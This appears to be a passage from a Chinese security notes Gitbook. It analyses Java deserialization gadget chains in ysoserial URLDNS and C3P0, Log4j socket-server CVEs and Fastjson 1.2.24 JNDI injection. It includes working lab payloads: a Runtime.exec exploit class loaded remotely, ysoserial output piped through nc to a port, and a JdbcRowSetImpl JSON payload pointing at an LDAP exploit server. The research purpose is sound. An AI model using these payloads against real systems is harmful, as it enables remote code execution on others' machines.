idea会自动识别ysoserial的主类ysoserial.GeneratePayload，然后直接运行项目即可；我们也可以通过pom.xml文件的mainClass属性看到主类，如果正常显示ysoserial的用法，就说明项目部署成功了。 因为ysoserial生成payload需要传入参数，所以我们手动配置一下项目，传入参数 Run --> Edit Configurations... 然后在Program arguments输入对应的参数 再次运行 生成了序列化数据，说明一切运行成功，就可以用idea开始动态调试了。 URLDNS链分析 URLDNS是ysoserial里面就简单的一条利用链，但URLDNS的利用效果是只能触发一次dns请求，而不能去执行命令。比较适用于漏洞验证这一块，尤其是无回显的命令执行，而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。 打开ysoserial/payloads/URLDNS.java的源码，可以看到它的调用链 * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() 这样看还是有点不特别明白，调试分析看看。 模拟对序列化后的ser文件进行反序列化处理，然后分析整个过程，反序列化代码如下（第一节中的反序列化代码）： 根据上述的Gadget Chain，可见触发点是在HashMap.readObject()，为了节约时间，我们直接在HashMap.readObject()处下断点。 运行主程序开始反序列化，自动在我们下断点的地方暂停。 然后一直F8 根据Gadget Chain发现使用了putVal方法，但这不是重点，重点是会调用hash方法 跟进hash方法 如果key不是null就会调用key.hashCode方法，跟进hashCode方法，这里调用的是URL类中的hashCode方法 当hashCode属性不为-1时就直接return，就不会触发hashCode方法，也就不会触发接下来的DNS解析 这里hashCode值默认为 -1，所以会执行 handler.hashCode(this); URLDNS链中也通过反射将hashCode的值设置为-1 跟一下handler，看看是什么玩意儿 是URLStreamHandler类（也是我们传入的handler），也就是说这里调用的是URLStreamHandler.hashCode 跟进hashCode方法，发现会调用getHostAddress方法对传入的URL对象进行解析 跟进getHostAddress方法，发现会调用getHost方法，然后调用InetAddress.getByName(host)发起DNS请求，至此整个过程完毕。 思考 分析过程中，发现HashMap.put方法中也调用了hash方法，然后去进行hashCode计算等。 那么就是说，在put操作的时候，也会触发对应的dns解析，试试看。 package org.example; import java.net.MalformedURLException; import java.net.URL; import java.util.HashMap; public class App { public static void main(String[] args) throws MalformedURLException { HashMap map = new HashMap(); URL url = new URL(\"http://cgu44y.dnslog.cn/\"); map.put(url, 2); } } 成功获取到了DNS解析请求记录。 那么为什么ysoserial在生成序列化数据的时候，也调用了put方法，但是没有收到DNS解析记录呢？ 原因就在于继承抽象类URLStreamHandler的SilentURLStreamHandler类中，重写了openConnection和getHostAddress 因此在调用 put 方法的时候不会触发 dns 查询。 进行尝试重写了openConnection和getHostAddress，发现确实不能收到dns查询记录。 package org.example; import java.io.IOException; import java.net.*; import java.util.HashMap; public class App { public static void main(String[] args) throws MalformedURLException { URLStreamHandler urlStreamHandler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } @Override protected synchronized InetAddress getHostAddress(URL u){ return null; } }; HashMap map = new HashMap(); URL url = new URL(null, \"http://qyd9tm.dnslog.cn/\", urlStreamHandler); map.put(url, 2); } } 那这样我们反序列化的时候不是也因为重写了方法而不能进行 dns 查询吗？ 原因在于 URL 里面的 handler 设置的是 transient 我们都知道一个对象只要实现了Serilizable接口，这个对象就可以被序列化，java的这种序列化模式为开发者提供了很多便利，我们可以不必关系具体序列化的过程，只要这个类实现了Serilizable接口，这个类的所有属性和方法都会自动序列化。 然而在实际开发过程中，我们常常会遇到这样的问题，这个类的有些属性需要序列化，而其他属性不需要被序列化，打个比方，如果一个用户有一些敏感信息（如密码，银行卡号等），为了安全起见，不希望在网络操作（主要涉及到序列化操作，本地序列化缓存也适用）中被传输，这些信息对应的变量就可以加上transient关键字。 也就是说transient修饰符无法被序列化，所以虽然它最后是没执行dns请求，但是在反序列化的时候还是会执行dns请求 测试一下transient package org.example; import java.io.*; import java.util.Arrays; public class App { public static void main(String[] args) throws IOException, ClassNotFoundException { Test test = new Test(); // 设置值 test.test = \"Test Value\"; System.out.println(test.test); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(test); System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray())); // 反序列化 ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); Test serTest = (Test) objectInputStream.readObject(); System.out.println(serTest.test); } } class Test implements Serializable { transient public String test; } 可见反序列化后的值为null，说明序列化时并没有将test对应的值代入进去。 总结 这条链还是比较简单的，主要是反序列化过程中HashMap的Key会进行Key.HashCode()计算，如果Key传入的是URL(URL context, String spec, URLStreamHandler handler)类型（重写URLStreamHandler避免有多余的DNS请求），在计算hashCode()的时候，就会调用URLStreamHandler.hashCode()触发getHost方法对目标进行DNS解析。 举个例子： package org.example; import java.io.IOException; import java.net.MalformedURLException; import java.net.URL; import java.net.URLConnection; import java.net.URLStreamHandler; public class App { public static void main(String[] args) throws MalformedURLException { /* * `URL(URL context, String spec, URLStreamHandler handler)`类型，在计算`hashCode()`的时候，就会调用`URLStreamHandler.hashCode()`触发`getHost`方法对目标进行DNS解析 * */ URLStreamHandler handler = new URLStreamHandler() { @Override protected URLConnection openConnection(URL u) throws IOException { return null; } }; URL url = new URL(null, \"http://k0e09d.dnslog.cn/\", handler); url.hashCode(); // 触发点 } } 整个调用链如下： HashMap.readObject() -> HashMap.putVal() -> HashMap.hash() -> URL.hashCode() -> URLStreamHandler.hashCode().getHostAddress() -> URLStreamHandler.getHostAddress().InetAddress.getByName() URLDNS 这个利用链主要用来检测是否存在反序列化漏洞，有如下两个优点： 使用java 内部的类进行构造，不依赖第三方库 如果目标可以出网，在目标没有回显的时候，可以用来验证是否存在反序列化漏洞 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/03.ysoserial-C3P0分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/03.ysoserial-C3P0分析.html","title":"03.ysoserial-C3P0分析","keywords":"","body":" 介绍 基础使用 Pom.xml 开始使用 利用演示 反序列化链分析 Debug过程 反推过程 生成链分析 IDEA配置 开始调试 总结 参考 介绍 C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate、Spring等。 基础使用 先看看ysoserial中需要的依赖是啥，方便后期调试也可以用 Pom.xml com.mchange c3p0 0.9.5.2 开始使用 基础使用还需要引入依赖com.mysql.jdbc.Driver mysql mysql-connector-java 5.1.47 在src/main/resources目录下新建c3p0-config.xml，这个是c3p0默认配置文件 编写如下内容 com.mysql.jdbc.Driver jdbc:mysql://localhost:3306/test?useSSL=false&amp;characterEncoding=UTF-8 root root 30000 10 30 100 10 创建测试类进行连接 import com.mchange.v2.c3p0.ComboPooledDataSource; import java.sql.Connection; import java.sql.PreparedStatement; import java.sql.ResultSet; import java.sql.SQLException; public class Main { private static ComboPooledDataSource dataSource = new ComboPooledDataSource(); public static void main(String[] args) throws SQLException { Connection connection = dataSource.getConnection(); PreparedStatement sql = connection.prepareStatement(\"select username from user\"); ResultSet resultSet = sql.executeQuery(); while (resultSet.next()){ System.out.println(resultSet.getString(1)); } } } 成功 利用演示 编写恶意类Exploit.java import java.io.IOException; public class Exploit { public Exploit() throws IOException { java.lang.Runtime.getRuntime().exec(\"open -na Calculator\"); } } 编译成class文件 javac Exploit.java 启动http服务器 python3 -m http.server 8000 生成poc java -jar ysoserial-0.0.6-SNAPSHOT-all.jar C3P0 \"http://127.0.0.1:8000/:Exploit\" > poc.ser 编写代码来模拟进行反序列化 import java.io.*; public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fileInputStream = new FileInputStream(new File(\"poc.ser\")); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } 反序列化链分析 Debug过程 可能直接看利用链怎么生成的有点迷，我们看下反序列化的过程，因为要知道怎么触发的，再反过来看生成链可能会好一些 小技巧：从头下断点调到尾太慢了，中间太多不必要的细节，这里因为我们生成的POC反序列化过程中明确会调用Runtime.getRuntime().exec()，所以我们在exec()的地方下个断点，分析一下堆栈情况去核心点下断点分析 反序列化举例代码 import java.io.*; public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException { FileInputStream fileInputStream = new FileInputStream(new File(\"poc.ser\")); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); } } 运行到exec()时的堆栈调用情况 exec:348, Runtime (java.lang) :5, Exploit newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) referenceToObject:92, ReferenceableUtils (com.mchange.v2.naming) getObject:118, ReferenceIndirector$ReferenceSerialized (com.mchange.v2.naming) readObject:211, PoolBackedDataSourceBase (com.mchange.v2.c3p0.impl) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invokeReadObject:1185, ObjectStreamClass (java.io) readSerialData:2256, ObjectInputStream (java.io) readOrdinaryObject:2147, ObjectInputStream (java.io) readObject0:1646, ObjectInputStream (java.io) readObject:482, ObjectInputStream (java.io) readObject:440, ObjectInputStream (java.io) main:7, Main 分析堆栈可以看出，一直各种readObject反序列，直到关键的PoolBackedDataSourceBase$readObject，说明这里是我们需要观察的入口点 分析一下代码，ois是我们传入的序列化后的数据，反序列化后得到对象o,而o就是一个恶意的ReferenceSerialized类，然后会调用getObject方法 跟进，发现调用了ReferenceableUtils.referenceToObject方法，字面意思就是：给reference对象转换成object对象，可以理解为远程下载加载到本地吧 继续跟进，发现此处利用URLClassLoader构建了一个远程加载类的加载器，然后使用Class.forName来远程加载这个类，fClassName为远程加载的类名（此处会发起http请求获取恶意类） 最后通过实例化该类，触发恶意的构造函数，执行系统命令 反推过程 根据整个反序列化的过程理一下，看看怎么生成POC 首先需要触发PoolBackedDataSourceBase.readObject()，也就是说我们序列化的对象必须是PoolBackedDataSourceBase类 其次根据readObject中的判定o instanceof IndirectlySerialized，所以我们序列化的对象需要是IndirectlySerialized的子类 序列化对象同时还需要包含是一个恶意的Reference类对象 最后通过writeObject进行序列化 所以生成一个恶意序列化的数据的思路简化一下：创建一个PoolBackedDataSourceBase类对象，然后给他包装成一个恶意的Reference类，再包装成可序列化的，最后序列化即可 生成链分析 IDEA配置 IDEA调试ysoserial，配置一下C3P0的生成参数 运行GeneratePayload，能看到输出，说明成功 开始调试 生成的时候，会调用getObject函数开始，所以这里下一个方法断点 运行后，会到断点处停止，前面一部分是判断命令参数是否正确的内容，可以不用太关注，我们一步一步的F8 到了54行，可以看到调用了Reflections.createWithoutConstructor(PoolBackedDataSource.class) 翻译一下就是通过反射创建了一个com.mchange.v2.c3p0.PoolBackedDataSource类对象b 然后将对象b的字段connectionPoolDataSource的值通过反射设置为我们创建的PoolSource类，参数为我们传入的URL和类名 connectionPoolDataSource在后续的过程中会发现其定义是ConnectionPoolDataSource connectionPoolDataSource，所以我们在编写PoolSource的时候继承了ConnectionPoolDataSource接口 最后返回对象b 继续F8，发现此处会进行序列化 传入的参数是我们刚才生成的PoolBackedDataSource对象b，跟进 发现最后会调用writeObject进行序列化，跟进，对我们反射赋值的connectionPoolDataSource序列化会到达PoolBackedDataSourceBase.writeObject()中 在序列化的时候，会抛出异常，因为我们序列化对象obj的变量connectionPoolDataSource的值C3P0$PoolSource类不是可序列化的，没有声明序列化接口 继续向下，会新建一个对象indirector，然后调用它的indirectForm()方法，参数为我们反射设置的字段connectionPoolDataSource，跟一下 发现会先给orig转换成Referemceable类，这也是为啥C3P0$PoolSource要实现Referenceable接口，然后调用getReference()方法，相当于调用的C3P0$PoolSource@getReference()方法，也是我们可以在ysoserial中看到的重写的方法 跟进，发现就是返回了一个JNDI的Reference，如果\"exploit\"类不存在，就会从我们指定的URL上加载恶意的类 返回Reference后，再通过ReferenceSerialized进行序列化 跟进发现，其实就是声明了可序列化 最后返回到PoolBackedDataSourceBase.writeObject()中，再次writeObject()，这个时候序列化的，其实就是一个可序列化的恶意的Reference 总结 感觉思路很简单： 创建一个com.mchange.v2.c3p0.PoolBackedDataSource对象 通过反射将其字段connectionPoolDataSource的值设置成我们编写的PoolSource类，这个类需要传入url地址和恶意的类名，且重写getReference方法，重写方法主要是返回一个恶意的JNDI Reference 序列化过程中，因为我们编写的类PoolSource不是可序列化的，所以第一次序列化抛出异常，会进入到catch中再次序列化 catch中的序列化之前，会调用PoolSource.getReference获取一个恶意类，然后声明为可序列化的，再序列化，得到结果 再总结一下： 主要是PoolBackedDataSourceBase这个类中的connectionPoolDataSource这个变量可控，且这个变量在再次序列化的过程中会调用特定的方法（这个方法内容也是我们可控的），最后生成一个恶意的可序列化的JNDI Reference，然后输出序列化数据。 参考 ysoserial-C3P0 ysoserial-C3P0 分析 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/01.log4j反序列化漏洞分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/01.log4j反序列化漏洞分析.html","title":"01.log4j反序列化漏洞分析","keywords":"","body":" 介绍 基础使用 pom.xml log4j2.xml Test.java CVE-2017-5645 简介 环境准备 直接复现 环境启动 漏洞复现 DEBUG分析 CVE-2019-17571 简介 环境准备 Debug分析 其他 介绍 https://logging.apache.org/log4j/2.x/ Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。 简单来说，Log4j是一种非常流行的日志框架，最新版本是2.x；也是一个组件化设计的日志系统，它的架构大致如下： log.info(\"User signed in.\"); │ │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ├──>│ Appender │───>│ Filter │───>│ Layout │───>│ Console │ │ └──────────┘ └──────────┘ └──────────┘ └──────────┘ │ │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ├──>│ Appender │───>│ Filter │───>│ Layout │───>│ File │ │ └──────────┘ └──────────┘ └──────────┘ └──────────┘ │ │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ └──>│ Appender │───>│ Filter │───>│ Layout │───>│ Socket │ └──────────┘ └──────────┘ └──────────┘ └──────────┘ 当我们使用Log4j输出一条日志时，Log4j自动通过不同的Appender把同一条日志输出到不同的目的地。例如： console：输出到屏幕； file：输出到文件； socket：通过网络输出到远程计算机； jdbc：输出到数据库 在输出日志的过程中，通过Filter来过滤哪些log需要被输出，哪些log不需要被输出。例如，仅输出ERROR级别的日志。 最后，通过Layout来格式化日志信息，例如，自动添加日期、时间、方法名称等信息。 基础使用 pom.xml org.apache.logging.log4j log4j-core 2.8.1 log4j2.xml https://blog.csdn.net/pan_junbiao/article/details/104313938 我们把一个log4j2.xml的文件放到classpath下就可以让Log4j读取配置文件并按照我们的配置来输出日志。 [%-5p] %d %c - %m%n =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n logs/myLog.log Test.java package org.example; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import java.util.function.LongFunction; public class Test { public static void main( String[] args ) { Logger logger = LogManager.getLogger(LongFunction.class); logger.trace(\"trace level\"); logger.debug(\"debug level\"); logger.info(\"info level\"); logger.warn(\"warn level\"); logger.error(\"error level\"); logger.fatal(\"fatal level\"); } } CVE-2017-5645 简介 Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。在使用TCP/UDP 套接字接口监听获取序列化的日志事件时，存在反序列化漏洞。 环境准备 org.apache.logging.log4j log4j-core 2.8.1 com.beust jcommander 1.48 直接复现 环境启动 找到刚才下载的jar包，执行如下命令启动监听6666端口 java -cp log4j-core-2.8.1.jar:log4j-api-2.8.1.jar:jcommander-1.48.jar org.apache.logging.log4j.core.net.server.TcpSocketServer -p 6666 漏洞复现 使用ysoserial直接生成恶意的序列化数据，并发送给6666端口 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://jqi53t.dnslog.cn | nc 127.0.0.1 6666 使用URLDNS链，反序列化后查看DNSLOG，已经收到请求 DEBUG分析 编写启动代码，其实主要就是调用了org.apache.logging.log4j.core.net.server.TcpSocketServer.main()，和前面命令行启动一样 package org.example; import org.apache.logging.log4j.core.net.server.TcpSocketServer; public class Test { public static void main(String[] args) throws Exception { String[] arg = {\"-p\", \"6666\"}; TcpSocketServer.main(arg); } } 分析一下整个过程，在main()那下断点，启动 跟进main() BasicCommandLineArguments.parseCommandLine()不难猜出是解析参数的，跳过 经过一些判断，到了 createSerializedSocketServer()方法，看名字是创建序列化socket服务端，跟进去 发现创建了一个TcpSocketServer，并且调用LOGGER.exit()方法返回，LOGGER.exit的功能就是对日志做些操作，然后仍然返回传进来的对象，所以这里相当于就是返回了TcpSocketServer。 返回TcpSocketServer.clss的main()方法，调用了socketServer.startNewThread()，看名字是新建一个线程，跟进去 AbstractSocketServer类实现了Runnable接口，在启动新线程的时候，会自动调用run()方法；（不熟悉可以去看看Java多线程） 这里多线程的任务程序是this，而此时的this是TcpSocketServer，所以会调用TcpSocketServer.run()方法，看下对应的run()方法 可见里面调用了serverSocket.accept()方法，返回一个Socket，这个没啥影响，但此时已经开始监听我们设定的端口了 手动向该端口发送数据，触发后续流程 然后用clientSocket实例化SocketHandler 看下SocketHandler的构造函数，给this.inputStream赋值 而TcpSocketServer.this.logEventInput的类是ObjectInputStreamLogEventBridge，这里相当于调用了它的wrapStream方法 接收到数据后的整个流程，就是把socket连接传过来的数据流作为包装成ObjectInputStream，现在this.inputStream就是一个来自用户输入的ObjectInputStream流了。 回到TcpSocketServer的run方法 继续往下，执行了handler.start()，而handler是SocketHandler类的实例，这个类继承自Log4jThread，Log4jThread又继承自Thread类，所以他是一个自定义的线程类，自定义的线程类有个特点，那就是必须重写run方法，而且当调用自定义线程类的start()方法时，会自动调用它的run()方法 然后默认会进入到TcpSocketServer.this.logEventInput.logEvents这个方法，跟进 调用了readObject()进行反序列化，然后触发我们的恶意链，到此分析结束 总结：inputStream就是被封装成ObjectInputStream流的、我们通过tcp发送的数据。所以只要log4j的tcpsocketserver端口对外开放，且目标存在可利用的pop链，我们就可以通过tcp直接发送恶意的序列化payload实现RCE。 CVE-2019-17571 简介 https://logging.apache.org/log4j/1.2/ 和上面的CVE差不多，只是触发点是SocketNode的run()方法，且这个地方需要的log4j的版本是1.2，感觉是为了凑CVE？ 环境准备 log4j log4j 1.2.17 Debug分析 启动函数，有错误啥的可以不用管，不影响复现 package org.example; import org.apache.log4j.net.SocketServer; public class Test { public static void main(String[] args) { String[] arg = {\"6666\", \"./\", \"./\"}; SocketServer.main(arg); } } 一样的，main下断点 跟进main，先初始化参数 然后一直到serverSocket.accept，开启监听 传入恶意的序列化数据 继续往下，先实例化SocketNode，然后实例化Thread，最后调用start 跟进SocketNode，发现会将我们传入的数据转换成ObjectInputStream类，并赋值给变量ois 然后返回main方法中，发现调用了start()方法，根据多线程，调用start()方法其实就是调用了对应类的run()方法，这里其实就是调用的SocketNode.run() 跟进SocketNode.run()，发现this.ois调用了方法readObject()，至此反序列化完成 查看dnslog日志，成功触发 其他 log4j是一个日志组件，在用log4j搭建日志服务器集中管理日志的时候会用到socketserver这种机制，试了一下用nmap识别不出服务，所以还是以审计发现该漏洞为主吧。 Log4j2 TcpSocketServer 日志集中打印 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:52:00 "},"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/02.Fastjson 1.2.24反序列化漏洞分析.html":{"url":"个人知识库/02.代码审计/01.Java安全/03.应用漏洞分析/02.Fastjson 1.2.24反序列化漏洞分析.html","title":"02.Fastjson 1.2.24反序列化漏洞分析","keywords":"","body":" 前言 DEMO 环境搭建 序列化 反序列化‼️ 利用链 分析 利用 复现 总结 DEBUG分析 修复方案 一些细节 举例演示 分析 TemplatesImpl攻击调用链路 参考链接 前言 前面讲了JNDI注入相关的知识，不实际操作操作怎么能行呢！ 这里就主要分析一下fastjson 1.2.24版本的反序列化漏洞，这个漏洞比较普遍的利用手法就是通过JNDI注入的方式实现RCE，所以是一个不得不分析的JNDI注入实践案例！ 这里不同与我们之前分析的反序列化，fastjson是一个非常流行的库，它可以将数据在JSON和Java Object之间互相转换，我们常说的fastjson序列化就是将java对象转化为json字符串，而反序列化就是将json字符串转化为java对象。 DEMO 环境搭建 pom.xml com.alibaba fastjson 1.2.24 序列化 package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main( String[] args ){ User user = new User(); user.setAge(66); user.setUsername(\"test\"); String json = JSON.toJSONString(user); System.out.println(json); } } class User{ private String username; private int age; public void setUsername(String username) { this.username = username; } public String getUsername() { return username; } public void setAge(int age) { this.age = age; } public int getAge() { return age; } } 运行后，得到对应的JSON格式字符串 反序列化‼️ fastjson反序列化到对应类的过程中会自动调用目标对象的setXXX方法，例如{\"age\":66,\"username\":\"test\"}被反序列化为User类时会自动调用User类的setAge以及setUsername方法，实践出真知 修改一下User类，在setXXX方法里面添加输出 class User{ private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } 修改App启动类，反序列化生成User对象 package org.example; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class App { public static void main( String[] args ){ String json = \"{\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; User user = JSON.parseObject(json, User.class); // 后面的User.class表示反序列化为User类 } } 执行后，可以看到在反序列化的过程中确实调用了setXXX的方法 这里我们反序列化使用的是parseObject()方法，其实也可以用到parse()方法，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()； 他们的最主要的区别就是前者返回的是JSONObject，而后者会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，返回的是实际类型的对象；当在没有对应类的定义的情况下（没有在@type声明类），通常情况下都会使用JSON.parseObject来获取数据。 由于JSON.parseObject()要反序列化到对应的对象（比如demo中的User类对象，需要将第二个参数设置为User.class）才会触发类的setXXX方法，而直接使用该方法返回的是JSONObject对象，是不会触发setXXX方法的（因为JVM也不知道是哪个类的对象） 那要怎么处理才能让JSON.parseObject()在调用时，不输入第二个参数也能执行setXXX方法呢，答案就是上面利用parse()方法使到的用@type属性。 fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。 举个例子： package org.example; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class App { public static void main(String[] args) { String json1 = \"{\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; String json2 = \"{\\\"@type\\\":\\\"org.example.User\\\", \\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; System.out.println(\"反序列化JSON1\"); JSON.parseObject(json1); System.out.println(\"反序列化JSON1\"); JSON.parseObject(json2); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } 执行后，没有@type返回JSONObject，有@type则返回对应的类对象且成功调用了setXXX方法 可见@type参数的作用就是指定json字符串要反序列化为哪个类的对象，而就是这个属性，让我们能够对其进行漏洞利用。 利用链 分析 由于在反序列化的过程中会自动调用@type类中相关的setXXX方法，如果我们能找到一个类，且这个类的setXXX方法可以通过我们对参数的构造达到命令执行的效果，那攻击的目的不就达到了吗？ 如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。 不过一般没人会给私有属性加setter方法，加了就没必要声明为private了 经过大佬们的分析，就发现了com.sun.rowset.JdbcRowSetImpl这个类可以被利用 这个类中有很多的setXXX方法，但我们需要利用的，则是setDataSourceName()和setAutoCommit()这两个方法 JdbcRowSetImpl.setDataSourceName public void setDataSourceName(String var1) throws SQLException { if (this.getDataSourceName() != null) { if (!this.getDataSourceName().equals(var1)) { super.setDataSourceName(var1); this.conn = null; this.ps = null; this.rs = null; } } else { super.setDataSourceName(var1); } } 这里调用了父类的setDataSourceName方法，跟一下 BaseRowSet.setDataSourceName public void setDataSourceName(String name) throws SQLException { if (name == null) { dataSource = null; } else if (name.equals(\"\")) { throw new SQLException(\"DataSource name cannot be empty string\"); } else { dataSource = name; } URL = null; } 可以看到就是设置了dataSource JdbcRowSetImpl.setAutoCommit public void setAutoCommit(boolean var1) throws SQLException { if (this.conn != null) { this.conn.setAutoCommit(var1); } else { this.conn = this.connect(); this.conn.setAutoCommit(var1); } } 进行了connect()操作，跟进connect() JdbcRowSetImpl.connect private Connection connect() throws SQLException { if (this.conn != null) { return this.conn; } else if (this.getDataSourceName() != null) { try { InitialContext var1 = new InitialContext(); DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); return this.getUsername() != null && !this.getUsername().equals(\"\") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection(); } catch (NamingException var3) { throw new SQLException(this.resBundle.handleGetObject(\"jdbcrowsetimpl.connect\").toString()); } } else { return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null; } } 可以看到这里有JNDI注入中的lookup的调用，而调用的参数就是刚才设置的dataSource，这个是我们可以控制的，如果让他加载恶意的Reference类，那么我们的目的就达成了。 利用 根据之前的学习和分析，利用类com.sun.rowset.JdbcRowSetImpl，利用的set方法setDataSourceName和setAutoCommit，构造payload { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"恶意的Reference类\", \"autoCommit\": true/false } 复现 直接用JNDIExploit同时启动ldap和http服务，好处就是不需要自己手动编译class什么的了 当然也可以使用marshalsec快速开启rmi或者ldap服务，再手动开启http服务 # 查看用法 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -l 9999 -p 8888 -u # 启动服务 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -l 9999 -p 8888 反序列化json package org.example; import com.alibaba.fastjson.JSON; public class App { public static void main(String[] args) { // 高版本的JDK，需要设置一下，低版本的可以忽略，参考JNDI注入文章 System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); String json = \"{\\\"@type\\\": \\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\": \\\"ldap://127.0.0.1:9999/Basic/Command/open -na Calculator\\\",\\\"autoCommit\\\": false}\"; JSON.parseObject(json); } } 总结 整个过程其实也很简单，就是fastjson在反序列化的时候，会调用对应类设置了参数的setXXX方法，只需要找到一些对应的链，同时jdk满足要求就可以命令执行。 DEBUG分析 代码举例 package org.example; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; public class App { public static void main(String[] args) { String json = \"{\\\"@type\\\":\\\"org.example.User\\\",\\\"age\\\":66,\\\"username\\\":\\\"test\\\"}\"; JSONObject jsonObject = JSON.parseObject(json); } } class User { private String username; private int age; public void setUsername(String username) { this.username = username; System.out.println(\"call setUsername\"); } public String getUsername() { return username; } public void setAge(int age) { this.age = age; System.out.println(\"call setAge\"); } public int getAge() { return age; } } 因为我们现在知道反序列化的时候会调用setXXX的方法，所以现在setXXX方法处下个断点，看看堆栈情况 setAge:28, User (org.example) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:128, JSON (com.alibaba.fastjson) parseObject:201, JSON (com.alibaba.fastjson) main:10, App (org.example) 然后从下向上定位分析就行了，调用了哪个包重哪些类的哪些方法，一应俱全，避免一直F7、F8浪费时间，可以把精力放到参数的传递追踪上。 修复方案 1.2.25官方对漏洞进行了修复，对更新的源码进行比较，主要的更新在checkAutoType函数 public Class checkAutoType(String typeName, Class expectClass) { if (typeName == null) { return null; } else { String className = typeName.replace('$', '.'); if (this.autoTypeSupport || expectClass != null) { int i; String deny; for(i = 0; i clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) { clazz = this.deserializers.findClass(typeName); } if (clazz != null) { if (expectClass != null && !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName()); } else { return clazz; } } else { if (!this.autoTypeSupport) { String accept; int i; for(i = 0; i \" + expectClass.getName()); } return clazz; } } } if (this.autoTypeSupport || expectClass != null) { clazz = 